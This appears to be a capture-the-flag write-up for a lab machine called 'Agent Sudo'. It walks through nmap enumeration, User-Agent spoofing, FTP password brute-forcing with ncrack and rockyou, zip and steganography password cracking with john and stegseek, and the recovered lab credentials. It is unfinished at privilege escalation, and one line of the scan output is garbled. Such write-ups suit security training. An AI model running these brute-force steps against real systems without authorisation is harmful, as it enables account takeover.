# Agent Sudo
You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

## Resolution

### 1. Enumerate
Let's start enumerating the machine using nmap:
```
Nmap scan report for 10.10.130.231
Host is up (0.081s latency).
Not shown: 997 clFrom,<br>
Agent Rosed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Iteresting, we have a web server, an FTP server, and an SSH agent.\
Navigating to the web page, we get the following message
> Dear agents,
>
> Use your own codename as user-agent to access the site.
>
> From,\
> Agent R

The message mentions the `User-Agent` http header. There should be a perticular codename that will give us access to more pages in the web app.
Back to the hint in the room description, `C` is the actual user-agent that should be used. We can use many tools to edit the user-agent header; a browser plugin, burpsuite, curl, ...

Once the request made, we get redirected to `/agent_C_attention.php`:
> Attention chris,
>
> Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
>
> From,\
> Agent R

Our agent's name is Chris.

### 2. Hash-cracking and brute force

Chris' password is weak as agent J said, so it's most likely that we would be able to crack it using a standard wordlist attack on the FTP server.
We can use different tools to do so, here is the command snippet using `ncrack` alongside the `rockyou` wordlist (username.txt contains one entry which is chris):
```
$ ncrack -U username.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.130.231 

Starting Ncrack 0.7 ( http://ncrack.org ) at 2024-02-15 19:13 UTC
Stats: 0:00:59 elapsed; 0 services completed (1 total)
Rate: 8.70; Found: 1; About 0.00% done
(press 'p' to list discovered credentials)
Discovered credentials for ftp on 10.10.130.231 21/tcp:
10.10.130.231 21/tcp ftp: 'chris' 'crystal'
caught SIGINT signal, cleaning up
```

Found the password of chris. Now we can connect to the server and get all the files out there.\
```
$ ftp chris@10.10.130.231

Connected to 10.10.130.231.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45850|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```

First intersting file should be the message to agent J:

> Dear agent J,
>
> All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
>
> From,\
> Agent C

The password of J is somewhere in on of the pictures. This technique is called steganography. We can use `binwalk` to extract (`-e`) embded files and executable code:

```
$ binwalk cutie.png   

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

$ binwalk -e cutie.png
```

`binwalk` creates a folder with all the extracted data. The Zip archive is protected with a password which we can use `john` to brute force: First, get the hash of the password from the archive using `zip2john`, and second, launch the brute force attack:
```
$ zip2john 8702.zip > zip.hash

$ john zip.hash
```

After some time we get the password `alien`. Note that `john` used a default wordlist and that we can specify our own wordlist using `-wordlist:FILE`.
Inside the arhive, we find the following file `To_agentR.txt`:

> Agent C,
>
> We need to send the picture to 'QXJlYTUx' as soon as possible!
> 
> By,\
> Agent R

Nothing interresting but let's keep the info for the moment.\
Next, a steg(steganography) password is demanded. There are many tools to do so, again, by brute force. `stegseek` is one of them.
```
$ stegseek cutie.png /usr/share/wordlists/fasttrack.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file "cutie.png" is not supported.

$ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt  
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"           
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".
```

In addition to the passphrase, `stegseek` outputs the embedded file too, in this case `message.txt`:
> Hi james,
>
> Glad you find this message. Your login password is hackerrules!
>
> Don't ask me why the password look cheesy, ask agent R who set this password for you.
>
> Your buddy,\
> chris

### 3. Capture the user flag

Now that we have access to James credentials, we can connect to the machine via ssh.\
Once there, first thing we find is the user flag. Then, another alien picture `Alien_autospy.jpg`.

For those who have no idea about the context, me included, the hint is important. In short, I refer you to the Foxnews article intitled "Filmmaker reveals how he faked infamous 'Roswell alien autopsy' footage in a London apartment".

### 4. Privilege escalation

```
$ uname -a

Linux agent-sudo 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

TBC











